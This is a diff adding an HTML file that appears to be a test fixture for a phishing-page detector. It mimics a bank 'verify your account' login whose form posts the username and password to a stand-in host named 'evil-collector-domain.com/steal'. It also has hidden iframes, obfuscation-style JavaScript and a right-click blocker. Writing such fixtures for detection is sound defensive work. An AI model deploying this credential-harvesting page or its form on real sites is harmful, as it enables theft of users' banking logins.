@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verify Your Account Login - Secure Banking</title>
+    <link rel="icon" href="http://some-other-domain.com/favicon.ico">
+</head>
+<body>
+    <h1>Please confirm your account details</h1>
+
+    <!-- External form action: submits credentials to a different domain -->
+    <form action="http://evil-collector-domain.com/steal" method="POST">
+        <input type="text" name="username" placeholder="Username">
+        <input type="password" name="password" placeholder="Password">
+        <button type="submit">Login</button>
+    </form>
+
+    <!-- Hidden iframe -->
+    <iframe src="http://tracker-domain.com/track" style="display:none;"></iframe>
+    <iframe src="http://another-domain.com/ads" style="visibility:hidden;"></iframe>
+
+    <!-- A few more iframes to trip the "excessive iframes" rule -->
+    <iframe src="http://x1.com"></iframe>
+    <iframe src="http://x2.com"></iframe>
+    <iframe src="http://x3.com"></iframe>
+
+    <!-- Suspicious JavaScript -->
+    <script>
+        eval("var x = 1;");
+        document.write("<p>loading</p>");
+        var data = unescape("%48%65%6C%6C%6F");
+        // Disable right click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    </script>
+
+    <!-- Lots of external links -->
+    <a href="http://external1.com">link1</a>
+    <a href="http://external2.com">link2</a>
+    <a href="http://external3.com">link3</a>
+</body>
+</html>
